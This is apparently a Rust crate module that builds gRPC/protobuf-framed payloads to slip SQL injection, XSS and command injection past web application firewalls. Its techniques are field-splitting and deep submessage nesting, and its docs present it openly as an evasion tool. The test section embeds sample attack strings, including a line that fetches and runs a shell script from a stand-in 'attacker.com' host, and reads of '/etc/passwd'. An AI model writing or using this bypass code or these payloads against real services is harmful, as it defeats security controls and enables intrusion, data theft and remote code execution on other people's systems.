//! gRPC / protobuf opaque-payload bypass.
//!
//! # The attack surface
//!
//! gRPC carries application data as a raw protobuf binary blob inside an
//! HTTP/2 DATA frame. The HTTP `Content-Type` is `application/grpc` (or
//! `application/grpc+proto`). Virtually every WAF in the wild was designed
//! for JSON / `x-www-form-urlencoded` traffic; when they see
//! `Content-Type: application/grpc` they typically:
//!
//! 1. Treat the body as opaque binary and **skip all keyword / regex rules**.
//! 2. At best, pass it to a generic binary-body heuristic with no
//!    SQL/XSS/CMD patterns.
//!
//! We exploit this by encoding attack payloads into valid protobuf wire
//! format and wrapping them in the 5-byte gRPC length-prefix frame. The
//! origin's protobuf parser decodes the string field back to plaintext and
//! executes the injection. The WAF never saw it.
//!
//! # Evasion primitives exported by this crate
//!
//! | Function | Technique |
//! |---|---|
//! | [`wrap_in_grpc_frame`] | 5-byte gRPC framing around arbitrary bytes |
//! | [`proto_string_field`] | Single protobuf string field (field_number, wire type 2) |
//! | [`embed_attack_in_message`] | payload → field 1 → gRPC frame |
//! | [`embed_attack_in_nested`] | N-level submessage nesting — defeats depth-limited inspectors |
//! | [`split_attack_across_fields`] | payload split across N string fields — WAF sees only fragments |
//!
//! # Wire-format notes (no protoc required)
//!
//! Protobuf wire format (proto3 / proto2 compatible):
//!
//! ```text
//! field tag  = (field_number << 3) | wire_type
//! wire_type 2 = length-delimited (bytes / string / embedded message)
//! encoding   = varint(tag) ++ varint(len) ++ bytes
//! ```
//!
//! gRPC framing (RFC / gRPC spec §5.1):
//!
//! ```text
//! byte 0      = compression flag (0 = uncompressed)
//! bytes 1..4  = big-endian u32 message length
//! bytes 5..   = serialised protobuf message
//! ```
//!
//! All functions in this crate are **pure** (no I/O, no allocation beyond
//! `Vec<u8>`), deterministic, and `#[must_use]` so callers cannot silently
//! discard the encoded bytes.

#![forbid(unsafe_code)]

/// Encode a protobuf varint (unsigned, variable-length).
///
/// Protobuf varints use 7 bits of data per byte; the MSB signals
/// continuation. This matches both proto2 and proto3 — the wire format
/// is identical for unsigned integers.
fn encode_varint(mut value: u64) -> Vec<u8> {
    let mut buf = Vec::with_capacity(10);
    loop {
        let byte = (value & 0x7F) as u8;
        value >>= 7;
        if value == 0 {
            buf.push(byte);
            break;
        }
        buf.push(byte | 0x80);
    }
    buf
}

/// Encode a single protobuf field tag.
///
/// `tag = (field_number << 3) | wire_type`
/// Wire type 2 = length-delimited (strings, bytes, embedded messages).
fn field_tag(field_number: u32, wire_type: u8) -> Vec<u8> {
    let tag = ((field_number as u64) << 3) | (wire_type as u64);
    encode_varint(tag)
}

/// Apply the 5-byte gRPC length-prefix framing to `payload_bytes`.
///
/// Framing layout (gRPC over HTTP/2 spec §5.1):
/// - Byte 0: compression flag (0 = uncompressed)
/// - Bytes 1–4: big-endian `u32` message length
/// - Bytes 5..: the raw protobuf message
///
/// WAFs that do not parse gRPC framing will see a binary blob whose first
/// bytes are `\x00` followed by a 4-byte length — no plaintext signal.
#[must_use]
pub fn wrap_in_grpc_frame(payload_bytes: &[u8]) -> Vec<u8> {
    let len = payload_bytes.len() as u32;
    let mut frame = Vec::with_capacity(5 + payload_bytes.len());
    frame.push(0u8); // compression flag: not compressed
    frame.extend_from_slice(&len.to_be_bytes()); // 4-byte big-endian length
    frame.extend_from_slice(payload_bytes);
    frame
}

/// Encode one protobuf string field.
///
/// Wire format:
/// ```text
/// varint(field_number << 3 | 2) ++ varint(len(value)) ++ utf8(value)
/// ```
///
/// This is the minimal, spec-correct encoding for a single `string` field
/// in a flat message. The field number must be 1–536_870_911 (proto3 max).
///
/// # Panics
///
/// Does not panic. Invalid field numbers (0 or > 2^29-1) produce
/// well-formed but spec-violating varints; callers should pass 1–15 for
/// single-byte tags.
#[must_use]
pub fn proto_string_field(field_number: u32, value: &str) -> Vec<u8> {
    let mut out = Vec::new();
    // Wire type 2 = length-delimited
    out.extend_from_slice(&field_tag(field_number, 2));
    out.extend_from_slice(&encode_varint(value.len() as u64));
    out.extend_from_slice(value.as_bytes());
    out
}

/// Encode one protobuf bytes field (wire type 2, same as string).
///
/// Identical wire format to [`proto_string_field`] but accepts raw bytes.
/// Used internally for nesting submessages (an embedded message is just
/// a length-delimited byte string).
fn proto_bytes_field(field_number: u32, value: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&field_tag(field_number, 2));
    out.extend_from_slice(&encode_varint(value.len() as u64));
    out.extend_from_slice(value);
    out
}

/// Wrap `payload` as protobuf field 1 (string), then apply gRPC framing.
///
/// This is the simplest single-field bypass: the entire attack string
/// lives in field 1 of a flat message. Most WAFs treating the body as
/// opaque binary will not extract this string.
///
/// The gRPC frame wrapping is applied last so the result is ready for
/// direct use as an HTTP/2 DATA frame body with
/// `Content-Type: application/grpc`.
#[must_use]
pub fn embed_attack_in_message(payload: &str) -> Vec<u8> {
    let proto_msg = proto_string_field(1, payload);
    wrap_in_grpc_frame(&proto_msg)
}

/// Nest `payload` inside `depth` levels of submessage, then gRPC-frame.
///
/// WAF inspection engines that parse protobuf often have a configurable
/// recursion limit (commonly 5–10 levels). Nesting beyond that limit
/// causes them to stop descending before they reach the payload string.
///
/// The protobuf encoding for a depth-`n` nested message is:
/// ```text
/// field1 { field1 { ... field1 { payload_string } ... } }
/// ```
/// which is wire-format compatible with any repeated-submessage schema.
///
/// `depth = 0` is equivalent to [`embed_attack_in_message`] (no nesting,
/// just field 1 + gRPC frame). `depth = 5` produces 5 levels of
/// submessage wrapping around the payload string.
#[must_use]
pub fn embed_attack_in_nested(payload: &str, depth: u8) -> Vec<u8> {
    // Start with the innermost payload string in field 1.
    let mut current = proto_string_field(1, payload);

    // Wrap `depth` times: each wrapping puts the previous bytes
    // into field 1 as an embedded message (wire type 2).
    for _ in 0..depth {
        current = proto_bytes_field(1, &current);
    }

    wrap_in_grpc_frame(&current)
}

/// Split `payload` across `n_fields` protobuf string fields and gRPC-frame the result.
///
/// # Evasion principle
///
/// WAF keyword/regex engines that do parse protobuf wire format typically
/// check each field value independently. If the payload `' OR 1=1--` is
/// split across fields 1–3 as `' OR`, ` 1=`, `1--`, no individual field
/// trips the SQL injection rule. The origin server's ORM concatenates the
/// parts (or the application logic joins them) and executes the injection.
///
/// Fields are numbered 1..=`n_fields`. If `n_fields` is 0 or 1, the
/// entire payload lands in field 1 (no splitting). The split is done on
/// UTF-8 character boundaries to avoid corrupting multibyte sequences.
///
/// # Fragment distribution
///
/// Payload bytes are divided as evenly as possible. The last field
/// receives any remainder, so for a 10-byte payload split across 3
/// fields: fields 1–2 get 3 bytes each, field 3 gets 4 bytes.
#[must_use]
pub fn split_attack_across_fields(payload: &str, n_fields: u8) -> Vec<u8> {
    if n_fields <= 1 {
        return embed_attack_in_message(payload);
    }

    let n = n_fields as usize;
    let bytes = payload.as_bytes();
    let total = bytes.len();
    let base_chunk = total / n;

    let mut out = Vec::with_capacity(total + n * 4);
    let mut offset = 0usize;

    for field_idx in 0..n {
        // Last field takes the remaining bytes.
        let chunk_len = if field_idx == n - 1 {
            total - offset
        } else {
            base_chunk
        };

        // Snap the split point down to a valid UTF-8 char boundary so we
        // never produce an invalid UTF-8 string field. Walk back from the
        // naive offset until `payload[..end]` is a char boundary.
        let end = offset + chunk_len;
        let end = snap_to_char_boundary(payload, end);

        let chunk = &payload[offset..end];
        offset = end;

        out.extend_from_slice(&proto_string_field((field_idx + 1) as u32, chunk));
    }

    wrap_in_grpc_frame(&out)
}

/// Snap `pos` down to the nearest valid UTF-8 character boundary in `s`.
///
/// Returns `s.len()` if `pos >= s.len()`.
fn snap_to_char_boundary(s: &str, pos: usize) -> usize {
    if pos >= s.len() {
        return s.len();
    }
    let mut p = pos;
    while p > 0 && !s.is_char_boundary(p) {
        p -= 1;
    }
    p
}

/// Decode the 5-byte gRPC frame header.
///
/// Returns `(compression_flag, message_length)` or an error if the
/// frame is too short.
///
/// Used by tests to round-trip the encoding and by callers that need
/// to inspect frames produced by third-party gRPC implementations.
///
/// # Errors
///
/// Returns [`GrpcFrameError::FrameTooShort`] if `frame.len() < 5`.
/// Returns [`GrpcFrameError::LengthMismatch`] if the declared payload
/// length exceeds the available bytes in `frame`.
pub fn decode_grpc_frame(frame: &[u8]) -> Result<(u8, u32, &[u8]), GrpcFrameError> {
    if frame.len() < 5 {
        return Err(GrpcFrameError::FrameTooShort {
            got: frame.len(),
            need: 5,
        });
    }
    let compression = frame[0];
    let declared_len = u32::from_be_bytes([frame[1], frame[2], frame[3], frame[4]]);
    let payload = &frame[5..];
    if payload.len() < declared_len as usize {
        return Err(GrpcFrameError::LengthMismatch {
            declared: declared_len,
            available: payload.len(),
        });
    }
    Ok((compression, declared_len, &payload[..declared_len as usize]))
}

/// Errors produced by [`decode_grpc_frame`].
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum GrpcFrameError {
    /// The frame slice is shorter than the mandatory 5-byte header.
    #[error("gRPC frame too short: need {need} bytes, got {got}")]
    FrameTooShort {
        /// Number of bytes provided.
        got: usize,
        /// Minimum required bytes.
        need: usize,
    },
    /// The declared payload length exceeds the available bytes.
    #[error("gRPC frame length mismatch: declared {declared} bytes but only {available} available")]
    LengthMismatch {
        /// Length claimed by the frame header.
        declared: u32,
        /// Bytes actually present after the header.
        available: usize,
    },
}

/// Decode one protobuf varint from `buf` starting at `offset`.
///
/// Returns `(value, new_offset)` or `None` if the buffer is exhausted
/// before the varint terminates.
pub fn decode_varint(buf: &[u8], mut offset: usize) -> Option<(u64, usize)> {
    let mut value: u64 = 0;
    let mut shift = 0u32;
    loop {
        let byte = *buf.get(offset)?;
        offset += 1;
        value |= ((byte & 0x7F) as u64) << shift;
        if byte & 0x80 == 0 {
            return Some((value, offset));
        }
        shift += 7;
        if shift >= 64 {
            return None; // overflow guard
        }
    }
}

/// Decode all length-delimited (wire type 2) string fields from a flat
/// protobuf message buffer and return them in field-number order.
///
/// Skips unknown wire types (varint / 64-bit / 32-bit) so the decoder
/// is robust against mixed-field messages. Only string/bytes/embedded
/// fields (wire type 2) are returned.
///
/// Used by tests to verify round-trip correctness of the hand-rolled
/// encoder without depending on generated prost code.
///
/// # Errors
///
/// Returns `None` if the buffer is malformed (truncated varint, declared
/// length exceeds available bytes, or unrecognised wire type).
pub fn decode_string_fields(buf: &[u8]) -> Option<Vec<(u32, Vec<u8>)>> {
    let mut fields = Vec::new();
    let mut offset = 0;

    while offset < buf.len() {
        let (tag, next) = decode_varint(buf, offset)?;
        offset = next;

        let field_number = (tag >> 3) as u32;
        let wire_type = (tag & 0x07) as u8;

        match wire_type {
            // Wire type 0: varint — skip value
            0 => {
                let (_, next) = decode_varint(buf, offset)?;
                offset = next;
            }
            // Wire type 1: 64-bit — skip 8 bytes
            1 => {
                offset = offset.checked_add(8)?;
                if offset > buf.len() {
                    return None;
                }
            }
            // Wire type 2: length-delimited (string / bytes / embedded msg)
            2 => {
                let (len, next) = decode_varint(buf, offset)?;
                offset = next;
                let end = offset.checked_add(len as usize)?;
                if end > buf.len() {
                    return None;
                }
                fields.push((field_number, buf[offset..end].to_vec()));
                offset = end;
            }
            // Wire type 5: 32-bit — skip 4 bytes
            5 => {
                offset = offset.checked_add(4)?;
                if offset > buf.len() {
                    return None;
                }
            }
            _ => return None, // unknown wire type
        }
    }

    Some(fields)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── gRPC framing ────────────────────────────────────────────────────

    #[test]
    fn grpc_frame_header_structure() {
        let payload = b"hello";
        let frame = wrap_in_grpc_frame(payload);
        assert_eq!(frame[0], 0, "compression flag must be 0");
        let declared_len = u32::from_be_bytes([frame[1], frame[2], frame[3], frame[4]]);
        assert_eq!(declared_len as usize, payload.len());
        assert_eq!(&frame[5..], payload);
    }

    #[test]
    fn grpc_frame_empty_payload() {
        let frame = wrap_in_grpc_frame(&[]);
        assert_eq!(frame.len(), 5, "empty payload → exactly 5 header bytes");
        assert_eq!(&frame[1..5], &[0, 0, 0, 0]);
    }

    #[test]
    fn grpc_frame_large_payload_10kb() {
        let payload: Vec<u8> = (0u8..=255).cycle().take(10 * 1024).collect();
        let frame = wrap_in_grpc_frame(&payload);
        let (compression, declared_len, body) = decode_grpc_frame(&frame).expect("decode");
        assert_eq!(compression, 0);
        assert_eq!(declared_len as usize, payload.len());
        assert_eq!(body, payload.as_slice());
    }

    #[test]
    fn decode_grpc_frame_too_short() {
        let err = decode_grpc_frame(&[0, 0, 0]).unwrap_err();
        assert!(matches!(
            err,
            GrpcFrameError::FrameTooShort { got: 3, need: 5 }
        ));
    }

    #[test]
    fn decode_grpc_frame_length_mismatch() {
        // Declare 100 bytes but only supply 5 bytes total (0 after header).
        let frame = &[0u8, 0, 0, 0, 100];
        let err = decode_grpc_frame(frame).unwrap_err();
        assert!(matches!(
            err,
            GrpcFrameError::LengthMismatch {
                declared: 100,
                available: 0
            }
        ));
    }

    // ── proto wire format ───────────────────────────────────────────────

    #[test]
    fn proto_string_field_wire_format_field1() {
        // field 1, wire type 2 → tag varint = (1 << 3) | 2 = 0x0A
        let value = "hello";
        let encoded = proto_string_field(1, value);
        assert_eq!(encoded[0], 0x0A, "field 1 tag byte");
        assert_eq!(encoded[1], 5u8, "length varint for 'hello'");
        assert_eq!(&encoded[2..], b"hello");
    }

    #[test]
    fn proto_string_field_wire_format_field2() {
        // field 2, wire type 2 → tag = (2 << 3) | 2 = 0x12
        let encoded = proto_string_field(2, "ab");
        assert_eq!(encoded[0], 0x12);
        assert_eq!(encoded[1], 2u8);
        assert_eq!(&encoded[2..], b"ab");
    }

    #[test]
    fn varint_encode_decode_roundtrip() {
        for &v in &[0u64, 1, 127, 128, 300, 16383, 16384, u64::MAX / 2] {
            let encoded = encode_varint(v);
            let (decoded, _) = decode_varint(&encoded, 0).expect("decode");
            assert_eq!(decoded, v, "varint roundtrip failed for {v}");
        }
    }

    // ── embed_attack_in_message ─────────────────────────────────────────

    #[test]
    fn embed_attack_preserves_payload() {
        let payload = "' OR 1=1--";
        let frame = embed_attack_in_message(payload);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode frame");
        let fields = decode_string_fields(proto_body).expect("decode fields");
        assert_eq!(fields.len(), 1);
        assert_eq!(fields[0].0, 1, "field number must be 1");
        assert_eq!(fields[0].1, payload.as_bytes());
    }

    #[test]
    fn embed_attack_xss_payload() {
        let payload = r#"<script>alert('xss')</script>"#;
        let frame = embed_attack_in_message(payload);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode frame");
        let fields = decode_string_fields(proto_body).expect("decode fields");
        assert_eq!(String::from_utf8(fields[0].1.clone()).unwrap(), payload);
    }

    // ── embed_attack_in_nested ──────────────────────────────────────────

    #[test]
    fn nested_depth_zero_equals_flat() {
        let payload = "test payload";
        let flat = embed_attack_in_message(payload);
        let nested = embed_attack_in_nested(payload, 0);
        assert_eq!(flat, nested, "depth=0 must equal flat embed");
    }

    #[test]
    fn nested_depth_5_produces_deeper_structure() {
        let payload = "SELECT * FROM users";
        let flat = embed_attack_in_message(payload);
        let nested = embed_attack_in_nested(payload, 5);
        // Nested frame must be larger (5 extra field tags + length varints).
        assert!(
            nested.len() > flat.len(),
            "depth-5 frame ({}) must be larger than flat ({})",
            nested.len(),
            flat.len()
        );
        // The outermost gRPC frame must decode without error.
        let (compression, _, _) = decode_grpc_frame(&nested).expect("decode nested frame");
        assert_eq!(compression, 0);
    }

    #[test]
    fn nested_depth_10_valid_frame() {
        let payload = "cmd; cat /etc/passwd";
        let frame = embed_attack_in_nested(payload, 10);
        let result = decode_grpc_frame(&frame);
        assert!(result.is_ok(), "depth-10 frame must be valid gRPC");
    }

    // ── split_attack_across_fields ──────────────────────────────────────

    #[test]
    fn split_single_field_equals_flat() {
        let payload = "UNION SELECT 1,2,3--";
        let split = split_attack_across_fields(payload, 1);
        let flat = embed_attack_in_message(payload);
        assert_eq!(split, flat, "n_fields=1 must equal flat embed");
    }

    #[test]
    fn split_across_10_fields_all_present() {
        let payload = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghij";
        let frame = split_attack_across_fields(payload, 10);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode frame");
        let fields = decode_string_fields(proto_body).expect("decode fields");
        assert_eq!(fields.len(), 10, "must have exactly 10 fields");
        // Concatenate all field values and verify the full payload is present.
        let reconstructed: String = fields
            .iter()
            .map(|(_, bytes)| String::from_utf8(bytes.clone()).unwrap())
            .collect();
        assert_eq!(reconstructed, payload);
    }

    #[test]
    fn split_across_3_fields_preserves_utf8() {
        // Payload with multibyte UTF-8 to stress the char-boundary snap logic.
        let payload = "あいうえおかきくけこさしすせそ"; // 15 chars × 3 bytes = 45 bytes
        let frame = split_attack_across_fields(payload, 3);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode frame");
        let fields = decode_string_fields(proto_body).expect("decode fields");
        assert_eq!(fields.len(), 3);
        let reconstructed: String = fields
            .iter()
            .map(|(_, b)| String::from_utf8(b.clone()).unwrap())
            .collect();
        assert_eq!(reconstructed, payload);
    }

    #[test]
    fn split_zero_fields_falls_back_to_flat() {
        let payload = "test";
        let result = split_attack_across_fields(payload, 0);
        let flat = embed_attack_in_message(payload);
        assert_eq!(result, flat);
    }

    // ── large payload ───────────────────────────────────────────────────

    #[test]
    fn large_payload_10kb_round_trip() {
        let payload: String = "A".repeat(10 * 1024);
        let frame = embed_attack_in_message(&payload);
        let (_, declared_len, proto_body) = decode_grpc_frame(&frame).expect("decode frame");
        assert!(declared_len > 10 * 1024, "must carry > 10 KB proto payload");
        let fields = decode_string_fields(proto_body).expect("decode fields");
        assert_eq!(fields.len(), 1);
        assert_eq!(fields[0].1, payload.as_bytes());
    }

    // ── attack string preservation ──────────────────────────────────────

    #[test]
    fn cmdi_payload_preserved() {
        let payload = "$(curl${IFS}attacker.com/shell.sh|bash)";
        let frame = embed_attack_in_message(payload);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode");
        let fields = decode_string_fields(proto_body).expect("fields");
        assert_eq!(String::from_utf8(fields[0].1.clone()).unwrap(), payload);
    }

    // ── Anti-rig: pin the gRPC frame header constants ───────────────────

    /// Anti-rig: the compression flag byte MUST be 0 (uncompressed).
    /// Any change that starts emitting 1 here is a silent protocol
    /// compatibility break — the origin's gRPC stub will try to
    /// decompress the body and produce garbage.
    #[test]
    fn wrap_in_grpc_frame_compression_flag_is_always_zero() {
        for size in [0, 1, 100, 1024] {
            let payload: Vec<u8> = (0u8..=255).cycle().take(size).collect();
            let frame = wrap_in_grpc_frame(&payload);
            assert_eq!(frame[0], 0, "compression flag must be 0 for size={size}");
        }
    }

    /// Anti-rig: frame header is exactly 5 bytes (RFC gRPC spec §5.1).
    /// If someone grows or shrinks it, every downstream decoder breaks.
    #[test]
    fn grpc_frame_header_length_is_exactly_5() {
        let frame = wrap_in_grpc_frame(&[]);
        assert_eq!(
            frame.len(),
            5,
            "empty payload frame must be exactly 5 bytes"
        );
    }

    // ── varint encode/decode edge cases ─────────────────────────────────

    #[test]
    fn varint_zero_encodes_to_single_byte() {
        let encoded = encode_varint(0);
        assert_eq!(encoded.len(), 1);
        assert_eq!(encoded[0], 0x00);
        let (decoded, offset) = decode_varint(&encoded, 0).unwrap();
        assert_eq!(decoded, 0);
        assert_eq!(offset, 1);
    }

    #[test]
    fn varint_127_fits_in_one_byte() {
        let encoded = encode_varint(127);
        assert_eq!(encoded.len(), 1, "127 must fit in one varint byte");
        assert_eq!(encoded[0], 0x7F);
    }

    #[test]
    fn varint_128_requires_two_bytes() {
        let encoded = encode_varint(128);
        assert_eq!(encoded.len(), 2, "128 requires 2 varint bytes");
        // First byte: 0x80 (continuation bit set, value bits = 0)
        assert_eq!(encoded[0] & 0x80, 0x80);
    }

    #[test]
    fn varint_u64_max_encodes_and_decodes() {
        let v = u64::MAX;
        let encoded = encode_varint(v);
        // u64::MAX needs 10 bytes in varint encoding.
        assert_eq!(encoded.len(), 10);
        let (decoded, _) = decode_varint(&encoded, 0).unwrap();
        assert_eq!(decoded, v);
    }

    #[test]
    fn varint_decode_empty_returns_none() {
        assert!(decode_varint(&[], 0).is_none());
    }

    #[test]
    fn varint_decode_past_end_returns_none() {
        let encoded = encode_varint(300);
        // Starting offset past the end.
        assert!(decode_varint(&encoded, 999).is_none());
    }

    // ── field_tag correctness ────────────────────────────────────────────

    /// Anti-rig: field 1, wire type 2 tag must be exactly 0x0A.
    /// This is the standard protobuf field-1 string tag — thousands of
    /// generated protobuf clients expect it. Changing it silently breaks
    /// interop.
    #[test]
    fn field_tag_field1_wiretype2_is_0x0a() {
        let tag = field_tag(1, 2);
        assert_eq!(tag, vec![0x0Au8], "field 1 wire-type 2 must encode as 0x0A");
    }

    #[test]
    fn field_tag_field2_wiretype2_is_0x12() {
        let tag = field_tag(2, 2);
        assert_eq!(tag, vec![0x12u8]);
    }

    #[test]
    fn field_tag_field15_wiretype2_single_byte() {
        // Field 15 fits in 1-byte tag: (15 << 3) | 2 = 122 = 0x7A
        let tag = field_tag(15, 2);
        assert_eq!(tag, vec![0x7Au8]);
    }

    #[test]
    fn field_tag_field16_wiretype2_two_bytes() {
        // Field 16: (16 << 3) | 2 = 130 → needs 2 varint bytes
        let tag = field_tag(16, 2);
        assert_eq!(tag.len(), 2);
    }

    // ── decode_grpc_frame error variants ─────────────────────────────────

    #[test]
    fn decode_grpc_frame_empty_returns_too_short() {
        let err = decode_grpc_frame(&[]).unwrap_err();
        assert!(matches!(
            err,
            GrpcFrameError::FrameTooShort { got: 0, need: 5 }
        ));
    }

    #[test]
    fn decode_grpc_frame_4_bytes_returns_too_short() {
        let err = decode_grpc_frame(&[0, 0, 0, 0]).unwrap_err();
        assert!(matches!(
            err,
            GrpcFrameError::FrameTooShort { got: 4, need: 5 }
        ));
    }

    #[test]
    fn decode_grpc_frame_exact_5_bytes_with_zero_len_succeeds() {
        // Header only, declared length 0 → empty payload slice.
        let frame = [0u8, 0, 0, 0, 0];
        let (compression, len, body) = decode_grpc_frame(&frame).expect("must succeed");
        assert_eq!(compression, 0);
        assert_eq!(len, 0);
        assert!(body.is_empty());
    }

    #[test]
    fn grpc_frame_error_display_mentions_byte_counts() {
        let err = GrpcFrameError::FrameTooShort { got: 3, need: 5 };
        let msg = err.to_string();
        assert!(
            msg.contains('3'),
            "got count missing from error message: {msg}"
        );
        assert!(
            msg.contains('5'),
            "need count missing from error message: {msg}"
        );
    }

    #[test]
    fn grpc_frame_error_length_mismatch_display() {
        let err = GrpcFrameError::LengthMismatch {
            declared: 999,
            available: 4,
        };
        let msg = err.to_string();
        assert!(msg.contains("999"), "declared length missing: {msg}");
        assert!(msg.contains('4'), "available length missing: {msg}");
    }

    // ── decode_string_fields edge cases ─────────────────────────────────

    #[test]
    fn decode_string_fields_empty_buffer_returns_empty_vec() {
        let fields = decode_string_fields(&[]).unwrap();
        assert!(fields.is_empty());
    }

    #[test]
    fn decode_string_fields_rejects_truncated_varint() {
        // A single 0x80 byte means "continuation" but there's no next byte.
        let result = decode_string_fields(&[0x80]);
        assert!(result.is_none(), "truncated varint must return None");
    }

    #[test]
    fn decode_string_fields_rejects_declared_len_beyond_buffer() {
        // Field 1, wire type 2, declared length 100, but only 3 bytes of payload.
        let mut buf = vec![0x0Au8]; // tag: field 1, wire 2
        buf.extend_from_slice(&encode_varint(100)); // claims 100 bytes
        buf.extend_from_slice(b"abc"); // only 3
        let result = decode_string_fields(&buf);
        assert!(result.is_none());
    }

    // ── split_attack_across_fields edge cases ────────────────────────────

    #[test]
    fn split_255_fields_covers_all_field_numbers() {
        // 255 is max u8, but field numbers go to 2^29; use a small payload
        // so we don't OOM on tiny per-field bytes.
        let payload = "x".repeat(255);
        let frame = split_attack_across_fields(&payload, 255);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode");
        let fields = decode_string_fields(proto_body).expect("fields");
        assert_eq!(fields.len(), 255);
        let reconstructed: String = fields
            .iter()
            .map(|(_, b)| String::from_utf8(b.clone()).unwrap())
            .collect();
        assert_eq!(reconstructed, payload);
    }

    #[test]
    fn split_payload_shorter_than_field_count_pads_with_empty_last_fields() {
        // 2-byte payload split across 5 fields — 3 fields must be empty.
        let payload = "ab";
        let frame = split_attack_across_fields(payload, 5);
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode");
        let fields = decode_string_fields(proto_body).expect("fields");
        let reconstructed: String = fields
            .iter()
            .map(|(_, b)| String::from_utf8(b.clone()).unwrap())
            .collect();
        assert_eq!(
            reconstructed, payload,
            "payload not preserved when shorter than field count"
        );
    }

    // ── embed_attack_in_nested depth boundaries ──────────────────────────

    #[test]
    fn nested_depth_255_valid_frame_and_no_panic() {
        let payload = "test";
        // 255 nesting levels is adversarial — must not panic or OOM.
        let frame = embed_attack_in_nested(payload, 255);
        let result = decode_grpc_frame(&frame);
        assert!(result.is_ok(), "depth-255 frame must decode without error");
    }

    #[test]
    fn nested_depth_increases_monotonically_with_depth() {
        let payload = "attack payload";
        let sizes: Vec<usize> = (0..=10u8)
            .map(|d| embed_attack_in_nested(payload, d).len())
            .collect();
        for i in 1..sizes.len() {
            assert!(
                sizes[i] > sizes[i - 1],
                "depth {i} frame ({}) must be larger than depth {} frame ({})",
                sizes[i],
                i - 1,
                sizes[i - 1]
            );
        }
    }

    // ── Concurrent encoding safety ───────────────────────────────────────

    /// All encoding functions are pure — they must produce identical output
    /// when called from multiple threads on the same input simultaneously.
    #[test]
    fn concurrent_embed_attack_is_deterministic() {
        use std::sync::{Arc, Barrier};
        use std::thread;

        let payload = "UNION SELECT 1,2,3--".to_string();
        let reference = embed_attack_in_message(&payload);
        let reference = Arc::new(reference);
        let barrier = Arc::new(Barrier::new(8));

        let handles: Vec<_> = (0..8)
            .map(|_| {
                let p = payload.clone();
                let r = reference.clone();
                let b = barrier.clone();
                thread::spawn(move || {
                    b.wait();
                    let result = embed_attack_in_message(&p);
                    assert_eq!(result, *r, "concurrent call produced different output");
                })
            })
            .collect();

        for h in handles {
            h.join().expect("thread must not panic");
        }
    }

    /// Boundary: empty payload encodes and decodes back to empty.
    #[test]
    fn embed_attack_empty_payload_round_trips() {
        let frame = embed_attack_in_message("");
        let (_, _, proto_body) = decode_grpc_frame(&frame).expect("decode");
        let fields = decode_string_fields(proto_body).expect("fields");
        // Field 1 exists with empty value.
        assert_eq!(fields.len(), 1);
        assert!(fields[0].1.is_empty());
    }
}
